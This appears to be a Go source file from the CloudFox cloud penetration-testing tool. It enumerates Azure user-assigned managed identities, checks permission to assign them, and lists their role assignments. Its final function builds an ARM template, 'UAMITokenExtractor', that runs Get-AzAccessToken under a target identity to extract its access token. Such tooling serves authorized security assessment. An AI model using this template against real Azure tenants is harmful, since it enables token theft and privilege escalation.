package azure

import (
	"context"
	"encoding/json"
	"fmt"
	"time"

	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/msi/armmsi"
	"github.com/BishopFox/cloudfox/globals"
)

// ==================== USER-ASSIGNED MANAGED IDENTITY STRUCTURES ====================

// UserAssignedIdentity represents a User-Assigned Managed Identity
type UserAssignedIdentity struct {
	Name            string
	PrincipalID     string
	ClientID        string
	ResourceGroup   string
	SubscriptionID  string
	Location        string
	ID              string
	HasAssignAccess bool
	RoleAssignments []UAMIRoleAssignment
}

// UAMIRoleAssignment represents a role assignment for a UAMI
type UAMIRoleAssignment struct {
	RoleDefinitionName string
	Scope              string
	SubscriptionID     string
}

// ==================== USER-ASSIGNED MANAGED IDENTITY HELPERS ====================

// GetUserAssignedIdentities retrieves all UAMIs in a subscription
func GetUserAssignedIdentities(session *SafeSession, subscriptionID string) ([]UserAssignedIdentity, error) {
	token, err := session.GetTokenForResource(globals.CommonScopes[0])
	if err != nil {
		return nil, err
	}
	cred := &StaticTokenCredential{Token: token}
	ctx := context.Background()

	client, err := armmsi.NewUserAssignedIdentitiesClient(subscriptionID, cred, nil)
	if err != nil {
		return nil, err
	}

	var results []UserAssignedIdentity

	pager := client.NewListBySubscriptionPager(nil)
	for pager.More() {
		page, err := pager.NextPage(ctx)
		if err != nil {
			return results, err
		}

		for _, uami := range page.Value {
			if uami == nil || uami.Name == nil {
				continue
			}

			identity := UserAssignedIdentity{
				Name:           SafeStringPtr(uami.Name),
				ID:             SafeStringPtr(uami.ID),
				Location:       SafeStringPtr(uami.Location),
				SubscriptionID: subscriptionID,
			}

			// Extract resource group from ID
			if uami.ID != nil {
				identity.ResourceGroup = GetResourceGroupFromID(*uami.ID)
			}

			// Extract Principal ID and Client ID
			if uami.Properties != nil {
				identity.PrincipalID = SafeStringPtr(uami.Properties.PrincipalID)
				identity.ClientID = SafeStringPtr(uami.Properties.ClientID)
			}

			results = append(results, identity)
		}
	}

	return results, nil
}

// CheckUAMIAssignPermissions checks if the current user has permissions to assign a UAMI
func CheckUAMIAssignPermissions(session *SafeSession, uamiID string) (bool, error) {
	token, err := session.GetTokenForResource(globals.CommonScopes[0])
	if err != nil {
		return false, err
	}

	// Check permissions using Azure REST API
	url := fmt.Sprintf("https://management.azure.com%s/providers/Microsoft.Authorization/permissions?api-version=2022-04-01", uamiID)

	config := DefaultRateLimitConfig()
	config.MaxRetries = 5
	config.InitialDelay = 2 * time.Second
	config.MaxDelay = 2 * time.Minute

	body, err := HTTPRequestWithRetry(context.Background(), "GET", url, token, nil, config)
	if err != nil {
		return false, err
	}

	var permissions struct {
		Value []struct {
			Actions []string `json:"actions"`
		} `json:"value"`
	}

	if err := json.Unmarshal(body, &permissions); err != nil {
		return false, err
	}

	// Check for wildcard or specific assign action
	for _, perm := range permissions.Value {
		for _, action := range perm.Actions {
			if action == "*" || action == "Microsoft.ManagedIdentity/userAssignedIdentities/*/assign/action" {
				return true, nil
			}
		}
	}

	return false, nil
}

// GetUAMIRoleAssignments gets all role assignments for a UAMI across subscriptions and management groups
func GetUAMIRoleAssignments(session *SafeSession, principalID string, subscriptions []string) ([]UAMIRoleAssignment, error) {
	var results []UAMIRoleAssignment

	for _, subID := range subscriptions {
		// Get role assignments at subscription scope
		assignments, err := GetRoleAssignmentsForPrincipal(context.Background(), session, principalID, subID)
		if err != nil {
			continue
		}

		// Convert to UAMIRoleAssignment format
		for _, roleName := range assignments {
			results = append(results, UAMIRoleAssignment{
				RoleDefinitionName: roleName,
				Scope:              fmt.Sprintf("/subscriptions/%s", subID),
				SubscriptionID:     subID,
			})
		}
	}

	return results, nil
}

// GenerateUAMIDeploymentTemplate creates an ARM template for deploying a deployment script
// that can be used to impersonate a UAMI and extract tokens
func GenerateUAMIDeploymentTemplate(uamiName, uamiResourceGroup, uamiSubscriptionID, tokenScope string) string {
	scriptName := "UAMITokenExtractor"

	template := fmt.Sprintf(`{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "parameters": {
    "utcValue": {
      "type": "String",
      "defaultValue": "[utcNow()]"
    },
    "managedIdentitySubscription": {
      "type": "String",
      "defaultValue": "%s"
    },
    "managedIdentityResourceGroup": {
      "type": "String",
      "defaultValue": "%s"
    },
    "managedIdentityName": {
      "type": "String",
      "defaultValue": "%s"
    },
    "tokenScope": {
      "type": "String",
      "defaultValue": "%s"
    },
    "command": {
      "type": "String",
      "defaultValue": "(Get-AzAccessToken -ResourceUrl '[parameters(''tokenScope'')]').Token"
    }
  },
  "variables": {},
  "resources": [
    {
      "type": "Microsoft.Resources/deploymentScripts",
      "apiVersion": "2020-10-01",
      "name": "%s",
      "location": "[resourceGroup().location]",
      "kind": "AzurePowerShell",
      "identity": {
        "type": "UserAssigned",
        "userAssignedIdentities": {
          "[resourceId(parameters('managedIdentitySubscription'), parameters('managedIdentityResourceGroup'), 'Microsoft.ManagedIdentity/userAssignedIdentities', parameters('managedIdentityName'))]": {}
        }
      },
      "properties": {
        "forceUpdateTag": "[parameters('utcValue')]",
        "azPowerShellVersion": "8.3",
        "timeout": "PT30M",
        "arguments": "",
        "scriptContent": "$output = [parameters('command')]; $DeploymentScriptOutputs = @{}; $DeploymentScriptOutputs['text'] = $output",
        "cleanupPreference": "Always",
        "retentionInterval": "P1D"
      }
    }
  ],
  "outputs": {
    "result": {
      "value": "[reference('%s').outputs.text]",
      "type": "string"
    }
  }
}`, uamiSubscriptionID, uamiResourceGroup, uamiName, tokenScope, scriptName, scriptName)

	return template
}
